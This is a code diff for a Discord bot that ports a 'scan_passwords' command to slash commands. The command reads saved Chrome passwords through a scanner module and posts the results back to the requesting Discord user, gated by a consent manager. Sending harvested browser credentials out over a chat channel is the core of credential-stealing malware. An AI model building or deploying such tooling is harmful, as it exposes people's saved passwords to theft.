@@ -1,5 +1,6 @@
 import discord
 from discord.ext import commands
+from discord import app_commands
 from core.consent_manager import ConsentManager
 from core.password_scanner import PasswordScanner
 
@@ -11,16 +12,16 @@ class PasswordScanCommand(commands.Cog):
         self.consent_mgr = ConsentManager()
         self.scanner = PasswordScanner()
     
-    @commands.command(name='scan_passwords')
-    async def scan_passwords(self, ctx):
+    @app_commands.command(name="scan_passwords", description="Scan for saved browser passwords")
+    async def scan_passwords(self, interaction: discord.Interaction):
         """Scan for saved passwords"""
-        user_id = ctx.author.id
+        user_id = interaction.user.id
         
         if not self.consent_mgr.has_consent(user_id, 'passwords') and not self.consent_mgr.has_consent(user_id, 'all'):
-            await ctx.author.send("❌ You need to grant consent first! Use `!consent_passwords`")
+            await interaction.response.send_message("❌ You need to grant consent first! Use `/consent_passwords`", ephemeral=True)
             return
         
-        await ctx.author.send("🔓 Scanning for saved passwords...")
+        await interaction.response.defer(ephemeral=True)
         
         try:
             passwords = self.scanner.scan_chrome_passwords()
@@ -38,10 +39,15 @@ Chrome Passwords Found: {len(passwords)}
 ⚠️ Your passwords are at risk if browsers are compromised!
             """
             
-            await ctx.author.send(report)
+            if len(report) > 2000:
+                await interaction.followup.send(report[:2000], ephemeral=True)
+                await interaction.followup.send(report[2000:], ephemeral=True)
+            else:
+                await interaction.followup.send(report, ephemeral=True)
+            
             self.consent_mgr.log_consent(user_id, 'passwords', True, f"Scan complete - {len(passwords)} passwords found")
         except Exception as e:
-            await ctx.author.send(f"❌ Error during scan: {str(e)}")
+            await interaction.followup.send(f"❌ Error during scan: {str(e)}", ephemeral=True)
     
     def _format_passwords(self, passwords):
         """Format passwords for display"""
